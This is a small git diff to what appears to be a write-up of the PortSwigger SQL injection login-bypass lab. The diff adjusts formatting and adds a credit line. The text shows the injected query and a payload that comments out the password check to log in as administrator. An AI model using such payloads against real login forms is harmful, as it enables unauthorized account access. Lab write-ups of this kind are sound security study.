@@ -25,6 +25,7 @@ Code:<br>
 `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`<br>
 <br>`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`<br>
 <br>Payload:
-`username=administrator%27--&password=hello`<br>
+<br>`username=administrator%27--&password=hello`<br>
 Username field = "adminstrator'--"<br>
+Credit:<br>
 [SQL Login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
